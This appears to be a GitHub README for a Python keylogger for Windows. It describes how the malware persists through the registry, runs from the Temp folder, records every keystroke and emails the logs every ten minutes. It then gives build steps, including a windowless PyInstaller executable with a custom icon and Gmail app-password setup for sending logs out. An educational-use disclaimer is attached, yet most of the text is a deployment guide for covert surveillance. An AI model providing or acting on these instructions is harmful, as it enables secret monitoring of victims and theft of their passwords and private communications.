# Python Keylogger for Windows

Upon execution, the malware immediately initiates its process by adding itself to the Windows registry if not already present. It then changes its working directory to the system's temporary folder (`Temp`), an area often overlooked by regular users, granting the necessary permissions to execute its tasks without restrictions. This is crucial, as after each system reboot, the registry triggers the keylogger from the `System32` directory, which lacks write permissions for standard users. By operating from the `Temp` directory, the malware ensures it can create and modify log files without permission issues. The malware captures every keystroke, compiling detailed logs in a `.txt` file. Every 10 minutes, these logs are sent to a specified email address, after which the log file is cleared, maintaining a continuous and covert monitoring cycle.

### ⚠️ Disclaimer

This project is intended **exclusively for educational purposes**. It is designed to provide an understanding of how malware operates and interacts with operating system structures. This software should only be used in environments where all parties involved have granted explicit permission.

**Unauthorized use** of this software to monitor individuals without their knowledge and consent is illegal and unethical. The author does not endorse or condone any form of malicious activity. Users are responsible for ensuring they comply with all applicable laws and regulations in their jurisdiction.

### Getting started

#### System requirements
- MS Windows (tested on 10).
- [Python 3](https://www.python.org/downloads/) (tested on v. 3.12.5).

#### Usage

**1**
```
git clone https://github.com/szmpns/Keylogger.git
```
**2**
```
cd Keylogger
```
**3**
```
pip install -r requirements.txt
```
**4**
### Important: Configure Email Settings

Before running the project, make sure to fill in the following fields in the `send_email()` function:

```python
from_email = "" 
to_email = ""
password = ""
```

You should create a dedicated Gmail account for this purpose to handle email distribution. For detailed instructions, [click here](#configuring-gmail-smtp-settings) to learn how to enable SMTP and generate an app password.

**5**
```
python -m PyInstaller --onefile --noconsole --icon=icon.ico temp.py
```
**6**
```
cd dist
```

### Configuring Gmail SMTP Settings

If you want to use a Gmail account to send emails, follow these steps:

1. **Enable 2-Step Verification**:
   - Go to your [Google Account Security page](https://myaccount.google.com/security).
   - Under "Signing in to Google," click on **2-Step Verification** and follow the instructions to enable it.

2. **Create an App Password**:
   - Once 2-Step Verification is enabled, go to [this link](https://myaccount.google.com/apppasswords).
   - Enter a name for your app password(e.g., `Keylogger`) and click **Create**.
   - A 16-character app password will be shown. Copy this password.

3. **Update Your Code**:
   - Use this app password as the `password` in your `send_email()` function instead of your Gmail account password.

This will allow your script to send emails securely while keeping your Gmail account protected.

If you have any issues, check this guide: [Google Support](https://support.google.com/accounts/answer/185833?hl=en).

By using this project, you agree to take full responsibility for your actions and adhere strictly to legal and ethical standards.